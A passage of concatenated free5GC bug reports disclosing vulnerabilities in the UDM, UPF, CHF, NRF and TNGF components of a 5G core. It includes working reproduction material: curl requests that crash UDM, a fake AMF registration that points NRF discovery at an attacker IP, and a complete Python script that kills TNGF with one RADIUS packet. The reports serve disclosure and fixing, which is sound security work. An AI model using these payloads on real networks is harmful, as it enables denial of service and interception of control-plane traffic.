3. Send one `generate-auth-data` request with valid `servingNetworkName`, valid `ausfInstanceId`, valid-hex but too-short `resynchronizationInfo.auts`, and valid-hex `resynchronizationInfo.rand`.
4. Observe that the request returns `500` and `UDM` logs a slice-bounds panic.

```bash
curl -i -X POST \
  'http://10.100.200.10:8000/nudm-ueau/v1/imsi-208930000000003/security-information/generate-auth-data' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: Bearer <valid_nudm_ueau_jwt>' \
  --data '{
    "servingNetworkName":"5G:mnc093.mcc208.3gppnetwork.org",
    "ausfInstanceId":"8edccb41-3659-415b-bbf8-fcb162369275",
    "resynchronizationInfo":{
      "auts":"00",
      "rand":"00112233445566778899aabbccddeeff"
    }
  }'
```

## Expected Behavior
If `Auts` is too short for re-synchronization processing, `UDM` should return a controlled client or authentication error such as `4xx` or `403 authenticationRejected`.

`UDM` should never panic on attacker-controlled `Auts` length.

Not applicable.

- OS: `Ubuntu 22.04 LTS`

items.title: [Bugs] UPF crashes on Session Modification Request due to missing BAR ID reference
[Bugs] UPF silently returns Cause=Accepted when RemoveQER fails — QoS rules retained in gtp5g kernel after SMF removal, completing the full Remove* family error-discard vulnerability set
items.body: ## Bug Decription A SessionModificationRequest containing a RemoveQER IE referencing a non-existent QER-ID is predicted to cause the UPF to log a goroutine stack trace but return Cause=RequestAccepted, following the identical error-discard pattern confirmed across the full Remove* family. The QER removal failure is silently swallowed; the gtp5g kernel QER rule is not removed; the SMF believes the QER has been torn down. Impact QoS rule retained after session release: If RemoveQER fails silently during PDU session teardown, the gtp5g QER (rate-limiter/gate) remains active in the kernel after the session SEID is released. The kernel continues enforcing rate limits for a non-existent session, consuming token-bucket state and potentially misapplying rate limits to a new session that reuses the same kernel slot. gtp5g QER table exhaustion: Each silently failed RemoveQER permanently occupies a kernel QER slot. Under sustained attack, the gtp5g QER table fills completely — new sessions cannot install QER rules, and all 5G QoS enforcement fails for new subscribers. Gate state retained post-release: If a QER with GateStatus=closed (subscriber blocked) is not successfully removed, the block rule persists in the kernel for released sessions. If the session SEID is recycled (LIFO allocation), the new session inherits the blocking rule — a new subscriber is blocked without any control-plane instruction. Symmetry with UpdateQER: The same QER-ID desynchronization that causes UpdateQER silent failures also triggers RemoveQER silent failures, creating an irrecoverable QoS enforcement state requiring UPF restart. Root Cause Predicted pattern in session.go, handleSessionModificationRequest: err = sess.RemoveQER(i) if err != nil { sess.log.Errorf("Mod RemoveQER error: %+v", err) // error discarded — gtp5g QER rule retained; Cause=Accepted returned } Predicted pattern in node.go, (*Sess).RemoveQER: func (s *Sess) RemoveQER(id uint32) error { if _, ok := s.QERs[id]; !ok { return fmt.Errorf("RemoveQER: QER(%#x) not found", id) } // ... } ## To Reproduce Steps to reproduce the behavior: Run: python free5gc_upf_remove_qer_not_found_repro.py [free5gc_upf_remove_qer_not_found_repro.py](https://github.com/user-attachments/files/26702828/free5gc_upf_remove_qer_not_found_repro.py) ## Expected Behavior When RemoveQER fails, the UPF must return Cause=RuleCreationModificationFailure per 3GPP TS 29.244 §7.5.4. Silent acceptance of a failed QER removal leaves an active kernel rate-limiter for a session the SMF believes has been torn down, enabling QER table exhaustion DoS and gate-state inheritance across session reuse. ## Screenshots ## Environment free5GC Version: v4.2.1] OS: Ubuntu 22.04 Kernel version: normal go version: normal C compiler version (optional): normal ## Trace Files ### Configuration Files version: 1.0.3 description: UPF initial local configuration pfcp: addr: 127.0.0.8 # IP addr for listening nodeID: 127.0.0.8 # External IP or FQDN can be reached retransTimeout: 1s # retransmission timeout maxRetrans: 3 # the max number of retransmission ### PCAP File [free5gc_upf_remove_qer_not_found_repro.zip](https://github.com/user-attachments/files/26702522/free5gc_upf_remove_qer_not_found_repro.zip) ### Log File 2026-04-14T08:07:49.196668185Z [INFO][UPF][PFCP][LAddr:127.0.0.8:8805] handleSessionModificationRequest 2026-04-14T08:07:49.196830826Z [ERRO][UPF][PFCP][LAddr:127.0.0.8:8805][CPNodeID:127.0.0.100][CPSEID:0x9002][UPSEID:0x1] Mod RemoveQER error: RemoveQER: QER(0x1) not found github.com/free5gc/go-upf/internal/pfcp.(*Sess).RemoveQER /home/fei/free5gc/NFs/upf/internal/pfcp/node.go:322 github.com/free5gc/go-upf/internal/pfcp.(*PfcpServer).handleSessionModificationRequest /home/fei/free5gc/NFs/upf/internal/pfcp/session.go:220 github.com/free5gc/go-upf/internal/pfcp.(*PfcpServer).reqDispacher /home/fei/free5gc/NFs/upf/internal/pfcp/dispacher.go:23 github.com/free5gc/go-upf/internal/pfcp.(*PfcpServer).main /home/fei/free5gc/NFs/upf/internal/pfcp/pfcp.go:156 runtime.goexit /home/fei/go/pkg/mod/golang.org/toolchain@v0.0.1-go1.25.5.linux-amd64/src/runtime/asm_amd64.s:1693

items.title: [Bugs] CHF POST /nchf-convergedcharging/v3/chargingdata/{ChargingDataRef}/update and /release panic on long   subscriberIdentifier
items.body:
## Bug Decription
`CHF`'s authenticated converged-charging `update` and `release` routes can panic when the caller supplies an overly long `subscriberIdentifier`.

The affected routes are:

- `POST /nchf-convergedcharging/v3/chargingdata/{ChargingDataRef}/update`
- `POST /nchf-convergedcharging/v3/chargingdata/{ChargingDataRef}/release`

Both routes eventually write a local CDR file using attacker-controlled `subscriberIdentifier` as part of the filename:

- `ChargingDataUpdate()` calls `dumpCdrFile(ueId, ...)`
- `ChargingDataRelease()` calls `dumpCdrFile(ueId, ...)`
- `dumpCdrFile()` builds the filename as `"/tmp/" + ueid + ".cdr"`
- `CDRFile.Encoding()` calls `os.WriteFile(fileName, ...)` and then `panic(err)` on failure

If `subscriberIdentifier` is long enough, the resulting local filename exceeds filesystem limits and `CHF` panics with `file name too long`.

## To Reproduce
Steps to reproduce the behavior:
1. Produce a valid `nchf-convergedcharging` bearer token. In this validation an offline `RS512` JWT signed with `/home/ubuntu/free5gc_v421/free5gc/cert/nrf.key` was used.
2. Create a charging session with an excessively long `subscriberIdentifier`, for example `imsi-` followed by about 280 repeated characters.

Example request body:

```json
{
  "subscriberIdentifier": "imsi-aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
  "chargingId": 1,
  "nfConsumerIdentification": {
    "nodeFunctionality": "SMF",
    "nFName": "smfL",
    "nFIPv4Address": "10.100.200.6"
  },
```

items.title: [Bugs]NRF nnrf-nfm lacks NF Profile input validation — enables NF Registration Poisoning with arbitrary service endpoints
items.body:
## Bug Description

free5GC NRF (Docker image free5gc-fuzz:latest) does not validate the content of NF registration requests against 3GPP TS 29.510 field constraints. This allows input validation bypass at two levels:

1. **Field format/range validation missing**: `nfInstanceId` accepts non-UUID strings (violates TS 29.510 §6.1.6.2.2 UUID v4 requirement), `nfStatus` accepts invalid enum values, `heartBeatTimer` accepts out-of-range values (minimum is 1), `nfProfile` is not enforced as mandatory.

2. **Service endpoint integrity not verified**: `nfServices.ipEndPoints` accepts arbitrary IP addresses and ports. Combined with the format validation gap, an attacker can register an NF profile of any type (AMF, SMF, UDM, AUSF, NRF) whose service endpoints point to attacker-controlled IP addresses. Legitimate NFs discover this fake profile via `NFDiscover` and route control-plane signaling to the attacker's endpoint.

**Relationship to issue #846**: Issue #846 reports that `RegisterNFInstance` lacks OAuth authentication — unauthenticated parties can call the endpoint. This bug is orthogonal: even if OAuth middleware is added (fixing #846), an authenticated but malicious NF can still inject profiles with non-UUID identifiers, missing mandatory fields, out-of-range values, and arbitrary service endpoint IPs. #846 is about *who* can call the API; this bug is about *what data* the API accepts once called.

## To Reproduce

**Prerequisites**: NRF SBI endpoint accessible (default: `http://172.24.0.10:8000`)

**Step 1**: Register a malicious NF profile with fabricated service endpoints:

```bash
curl -X PUT \
  "http://<NRF_HOST>:8000/nnrf-nfm/v1/nf-instances/11111111-1111-1111-1111-111111111111" \
  -H "Content-Type: application/json" \
  -d '{
    "nfInstanceId": "11111111-1111-1111-1111-111111111111",
    "nfType": "AMF",
    "nfStatus": "REGISTERED",
    "heartBeatTimer": 3600,
    "plmnList": [{"mcc": "001", "mnc": "01"}],
    "sNssais": [{"sst": 1, "sd": "010203"}],
    "nfServices": [{
      "serviceInstanceId": "fake-amf-svc",
      "serviceName": "namf-comm",
      "versions": [{"apiVersionInUri": "v1", "apiFullVersion": "1.0.0"}],
      "scheme": "http",
      "nfServiceStatus": "REGISTERED",
      "ipEndPoints": [{"ipv4Address": "10.0.0.99", "port": 7777, "transport": "TCP"}]
    }]
  }'
```

**Step 2**: Confirm the fake NF is stored and publicly accessible:

```bash
curl "http://<NRF_HOST>:8000/nnrf-nfm/v1/nf-instances/11111111-1111-1111-1111-111111111111"
```

Returns HTTP 200 with the full NF profile including `ipv4Address: "10.0.0.99"`.

**Step 3**: Verify the fake NF appears in NF Discovery results visible to other NFs:

```bash
curl "http://<NRF_HOST>:8000/nnrf-disc/v1/nf-instances?target-nf-type=AMF&requester-nf-type=SMF"
```

The fake AMF (nfInstanceId: `11111111-1111-1111-1111-111111111111`) with service endpoint `10.0.0.99:7777` appears in the discovery response alongside legitimate AMF instances.

**Step 4**: A real SMF selecting this fake AMF from discovery results would send `N1N2MessageTransfer` requests to `10.0.0.99:7777` — the attacker's IP.

**Additional validation failures**: During testing we systematically verified 121 3GPP semantic constraints and found that free5GC NRF also accepts registrations with:
- `nfInstanceId: "not-a-uuid"` (non-UUID string, violates TS 29.510 §6.1.6.2.2 UUID v4 requirement)
- `nfStatus: "INVALID_STATUS"` (invalid enum, violates TS 29.510 §6.1.6.2.2 NFStatus enum)
- `heartBeatTimer: 0` (below minimum of 1, violates TS 29.510 §5.2.2.2)
- `nfProfile: null` (missing mandatory field, violates TS 29.510 §5.2.2.2)

All return HTTP 200/201 and are stored in MongoDB. The `nfInstanceId: "not-a-uuid"` case is particularly notable: the corrupt entry persists in MongoDB, is retrievable via direct GET, and appears in NFDiscovery results.

## Expected Behavior

Per 3GPP TS 29.510:

1. `nfInstanceId` MUST be a valid UUID v4 format (§6.1.6.2.2). Non-UUID values should return **HTTP 400 Bad Request** with a ProblemDetails body indicating the validation failure.
2. `nfStatus` MUST be one of `REGISTERED`, `SUSPENDED`, or `UNDISCOVERABLE` (§6.1.6.2.2).
3. `heartBeatTimer` MUST be an integer between 1 and 3600 (§5.2.2.2).
4. `nfProfile` (and its `nfType` subfield) MUST be present and valid in registration requests (§5.2.2.2).

NF Discovery MUST NOT return NF profiles that violate these constraints.

Additionally, as a defense-in-depth measure, NRF SHOULD validate that `nfServices.ipEndPoints` contain routable, authorized addresses within the operator's SBI network.

## Environment

- **free5GC Version**:Docker image free5gc-fuzz:latest
- **OS**: Ubuntu 22.04 Server
- **Kernel**: 6.8.0-111-generic
- **Go version**: 1.21 (free5GC container)
- **Deployment**: Docker Compose, isolated bridge network (172.24.0.0/24)
- **NRF**: 172.24.0.10:8000, MongoDB 172.24.0.120:27017

## Walkthrough

This bug was discovered during a systematic security evaluation of free5GC NRF using a **Constraint Interaction Graph** fuzzing framework. The methodology:

1. Extracted 121 semantic constraints from 10 3GPP specifications (TS 29.5xx series) covering NRF, AMF, SMF, AUSF, UDM, UDR, PCF, NSSF, BSF, and NAS protocols.
2. Modeled constraints as a multi-relational interaction graph with 3 core edge types: CONDITIONAL (causal dependencies, 23 edges), CONFLICT (mutual exclusion, 28 edges), and SHARED_FIELD (co-targeted fields, 58 edges).
3. Generated 50,000 semantically-valid-but-constraint-violating HTTP requests targeting the NRF SBI API.
4. Detected 9,756 accepted-invalid responses, deduplicated to 17 unique constraint violations across 5 root cause categories.

The NF Registration Poisoning attack chain (arbitrary service endpoint injection) was manually validated after automated discovery of the `nfInstanceId` format validation gap.

The full constraint corpus, test methodology, and deduplicated findings are available in the project repository.

## Log Evidence

**NRF logs** — The NRF container produced **exactly 15 log lines across 14 days of operation**, all of which are startup messages:

```
Line  1:  [INFO][NRF][Main] NRF version:
Line  2:    Not specify ldflags (which link version) during go build
Line  3:    go version: go1.25.5 linux/amd64
Line  4:  [INFO][NRF][CFG] Read config from [/free5gc/config/nrfcfg.yaml]
Line  5:  [INFO][NRF][Main] Log enable is set to [false]          ← logging DISABLED
...
Line 15: (identical pattern — 3 restarts × 5 lines each)
```

**Zero runtime log lines.** The NRF in its default configuration has HTTP request logging explicitly disabled (`configuration.LogEnable` defaulting to `false` in `nrfcfg.yaml`). This is a configuration default, not a code defect — the NRF *can* log requests if `LogEnable` is set to `true`.

However, the critical point is: **logging and validation are independent concerns.** Even with `LogEnable: true`, the NRF would log that it received and accepted the registration — but would still not reject the invalid data, because no field validation code exists. Enabling logging would give operators a record of the attack, but would not prevent it.

In other words:
- `LogEnable: false` → attack is invisible (no audit trail)
- `LogEnable: true`  → attack is visible in logs, but still succeeds (no validation)

During our testing, 450,000 HTTP requests were sent and 27,601 NF profiles were registered, including:
- `nfInstanceId: "not-a-uuid"` (non-UUID string, stored in MongoDB, visible via NFDiscover)
- `nfInstanceId: "11111111-1111-1111-1111-111111111111"` (fake AMF with `nfServices.ipEndPoints.ipv4Address: "10.0.0.99"`, stored in MongoDB, visible via NFDiscover)

With default configuration, not a single line in the NRF log indicates that any of these registrations occurred. An operator running free5GC NRF out of the box has **zero visibility** into NF registration activity, making detection of this attack impossible through NRF logs alone.

**MongoDB logs** — No schema validation errors. The `NfProfile` collection has no JSON schema validator configured, allowing arbitrary document structures to be stored without raising any database-level errors.

**Experiment logs** — 0 crashes across 450,000 HTTP requests spanning 3 groups × 3 trials × 50,000 iterations.

## Additional Context

**Security impact**: A malicious party with SBI network access can register NF profiles directing other NFs to attacker-controlled endpoints. This enables control-plane traffic interception, credential harvesting (via OAuth2 token requests), and denial of service by advertising non-existent NFs.

**Relationship to existing issues**: 
- **#846 (Unauthenticated RegisterNFInstance)**: Reports that the registration endpoint lacks OAuth. Our finding is orthogonal — even with OAuth, the NRF does not validate what the authenticated caller submits. #846 fixes *who* can register; this bug requires fixing *what* can be registered.
- **#847, #848 (Over-authorization in NFUpdate/Deregister)**: Authorization flaws in update/delete — also orthogonal to input validation.
- The systematic 17-constraint semantic validation gap analysis (covering all NRF NF profile fields against TS 29.510) is new and not covered by any existing issue.

**Suggested fix**:
1. Add UUID v4 format validation for `nfInstanceId` in registration/update handlers
2. Add enum validation for `nfStatus`, `nfType`, and other enumerated fields
3. Add range validation for `heartBeatTimer` (1-3600) and numeric fields
4. Return HTTP 400 with descriptive ProblemDetails on validation failure
5. Optionally: validate `nfServices.ipEndPoints` against a configured SBI address range

**Proof of concept data**: MongoDB contained 27,601 NF profiles at the time of testing, including profiles with `nfInstanceId: "not-a-uuid"` and `nfInstanceId: "11111111-1111-1111-1111-111111111111"` (the fabricated AMF). The corrupted entry with `nfInstanceId: "not-a-uuid"` appeared in `NFDiscover` results alongside the legitimate NRF instance.

items.title: [Bugs] TNGF RADIUS handler panics on short Called-Station-Id attribute value, allowing pre-authentication remote DoS
items.body:
## Bug Description

A remote, unauthenticated attacker can kill the entire TNGF process by sending a single 26-byte RADIUS Access-Request packet containing a `Called-Station-Id` attribute (Type 30) with a value shorter than 17 bytes. The `HandleRadiusAccessRequest()` function at `handler.go:61` performs a hard-coded slice `calledStationId[:17]` without first checking that the string is at least 17 characters long. When the attribute value is 1-16 bytes, this causes an immediate **panic: runtime error: slice bounds out of range [:17] with length N**.

Because the RADIUS dispatcher's `recover()` handler calls `Fatalf` (which invokes `os.Exit(1)`), this panic **terminates the entire TNGF process** — not just the affected goroutine.

**No RADIUS shared secret, no Message-Authenticator, no authentication of any kind is required.** The attacker only needs to send a single UDP packet to port 1812. The crash occurs during attribute parsing, **before** any security validation is performed.

**Crash site**:

`NFs/tngf/pkg/radius/handler/handler.go` line 61:
```go
case radius_message.TypeCalledStationId:
    calledStationId = string(radiusPayload.Val)
    calledStationId = strings.ReplaceAll(calledStationId[:17], "-", "")  // ❌ PANIC: [:17] on <17 bytes
    tnapId, err = strconv.ParseUint(calledStationId, 16, 64)
```

**Data flow**:

```
Attacker ──UDP 26 bytes──▶ TNGF:1812

service.go:64      listener.ReadFromUDP(data)        ← raw UDP, no auth
service.go:73      go radius.Dispatch(...)
dispatcher.go:30   radiusMessage.Decode(msg)          ← parse RADIUS header + attributes
dispatcher.go:38   handler.HandleRadiusAccessRequest()
handler.go:51-61   loop: parse CalledStationId attr
handler.go:61      calledStationId[:17]               ← PANIC: string has 4 chars
dispatcher.go:24   recover() → Fatalf → os.Exit(1)   ← TNGF process killed
```

**Why no authentication protects this code path**:

The `HandleRadiusAccessRequest()` function iterates through ALL RADIUS attributes in a single loop (lines 51-79). The `TypeCalledStationId` case at line 59 is reached **before** the `TypeMessageAuthenticator` case at line 67 is evaluated. Even if Message-Authenticator were mandatory (it is not — see additional finding below), the crash occurs during attribute extraction, not during security validation.

## To Reproduce

**Prerequisites**: free5GC v4.2.1 with TNGF deployed in Docker.

1. Send a single crafted UDP packet — this is the complete PoC:

```python
#!/usr/bin/env python3
"""PoC: TNGF RADIUS CalledStationId crash — 26-byte UDP packet kills TNGF process"""
import socket, struct, os

code = 1          # Access-Request
pkt_id = 0x42
authenticator = os.urandom(16)

# Called-Station-Id: Type=30, Length=6 (2-byte header + 4-byte value)
# Normal: 17+ chars like "AA-BB-CC-DD-EE-FF:ssid"
# Attack: only 4 chars → handler.go:61 does [:17] on 4-char string → PANIC
attr = bytes([30, 6]) + b'AAAA'

length = 20 + len(attr)
pkt = struct.pack('!BBH', code, pkt_id, length) + authenticator + attr

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.sendto(pkt, ('10.100.200.1', 1812))
sock.close()
print(f'Sent {len(pkt)} bytes → TNGF process killed')
```

2. Run:

```bash
docker restart tngf && sleep 10

# Verify TNGF is alive
docker ps --format "{{.Names}} {{.Status}}" | grep tngf
# → tngf Up 10 seconds

# Send exploit
python3 poc_radius.py
# → Sent 26 bytes → TNGF process killed

sleep 3

# Verify TNGF is dead
docker ps -a --format "{{.Names}} {{.Status}}" | grep tngf
# → tngf Exited (1) 3 seconds ago
```

3. Verify crash in logs:

```bash
docker logs tngf 2>&1 | grep -A5 "panic"
```

## Expected Behavior

The handler should validate the length of `calledStationId` before slicing:

```go
case radius_message.TypeCalledStationId:
    calledStationId = string(radiusPayload.Val)
    if len(calledStationId) < 17 {
        radiusLog.Errorf("Called-Station-Id too short: %d bytes", len(calledStationId))
        return
    }
    calledStationId = strings.ReplaceAll(calledStationId[:17], "-", "")
    tnapId, err = strconv.ParseUint(calledStationId, 16, 64)
```

## Environment

- free5GC Version: `v4.2.1`
- OS: `Ubuntu 24.04.2 LTS`
- Kernel version: `6.14.0-37-generic`
- go version: `go1.26.1 linux/amd64`
- Docker image: `free5gc/tngf:v4.2.1`

## Log File
```
[INFO][TNGF][Radius] Handle Radius Access Request
[FATA][TNGF][Radius] panic: runtime error: slice bounds out of range [:17] with length 4
goroutine 25 [running]:
runtime/debug.Stack()
	/usr/local/go/src/runtime/debug/stack.go:26 +0x5e
github.com/free5gc/tngf/pkg/radius.Dispatch.func1()
	/go/src/free5gc/NFs/tngf/pkg/radius/dispatcher.go:24 +0x38
panic({0xc83340?, 0xc00052c030?})
	/usr/local/go/src/runtime/panic.go:783 +0x132
github.com/free5gc/tngf/pkg/radius/handler.HandleRadiusAccessRequest(0xc0001ec040, 0xc000329dd0, 0xc00069c060, 0xc00038df50)
	/go/src/free5gc/NFs/tngf/pkg/radius/handler/handler.go:61 +0x28ba
github.com/free5gc/tngf/pkg/radius.Dispatch(0xc0001ec040, 0xc000329dd0, 0xc00069c060, {0xc000398280?, 0x0?, 0x0?})
	/go/src/free5gc/NFs/tngf/pkg/radius/dispatcher.go:38 +0x105
created by github.com/free5gc/tngf/pkg/radius/service.listenAndServe in goroutine 69
	/go/src/free5gc/NFs/tngf/pkg/radius/service/service.go:73 +0x31f
```

items.title: [Bugs] NRF accepts NF registration without required nfStatus field, causing HTTP 500 on all subsequent PATCH heartbeat requests for that NF instance
items.body: ## Bug Decription This vulnerability leverages a two-stage NNRF-NFM message sequence that exploits a missing input validation in the NF registration handler. By omitting the required `nfStatus` field on a PUT registration, the NF profile is persisted to MongoDB without the `nfStatus` key. Any subsequent standard PATCH heartbeat targeting that NF instance then fails with HTTP 500 because the json-patch `replace` operation requires the path to exist in the document. The error is unrecoverable without restarting free5GC or re-registering the NF instance: - free5GC NRF accepts `PUT /nnrf-nfm/v1/nf-instances/{id}` with `nfStatus` absent despite it being a **required** field in 3GPP TS 29.510 §5.2.2.2. - The MongoDB document is stored **without** the `nfStatus` key. - Every subsequent `PATCH /nnrf-nfm/v1/nf-instances/{id}` with `{"op":"replace","path":"/nfStatus","value":"REGISTERED"}` (the standard 3GPP heartbeat) fails with: ``` [ERRO][NRF][NFM] UpdateNFInstanceProcedure err: RestfulAPIJSONPatch Apply err: missing value replace operation does not apply: doc is missing key: /nfStatus ``` - NRF returns HTTP 500 for every heartbeat attempt on that NF instance until the process is restarted. - Any NF (AMF, SMF, PCF, …) registered in this manner will have its heartbeat permanently broken — NRF will eventually deem the NF UNDISCOVERABLE, breaking service discovery for all NFs that depend on it. ## To Reproduce Steps to reproduce the behavior: Run: python3 nrf_patch_missing_key_sender.py [nrf_patch_missing_key_sender.py](https://github.com/user-attachments/files/26920307/nrf_patch_missing_key_sender.py) ## Expected Behavior - `PUT /nnrf-nfm/v1/nf-instances/{id}` with a missing `nfStatus` field should be rejected immediately with HTTP 400 and a `ProblemDetails` body (`cause: MISSING_NF_STATUS`). The NF profile must not be persisted to MongoDB without all required fields. - If a malformed registration somehow reaches persistence, the PATCH heartbeat handler must check whether the target path exists in the document before applying the json-patch operation, and return a structured 4xx error rather than an internal 500. - A single malformed PUT registration must not be able to permanently
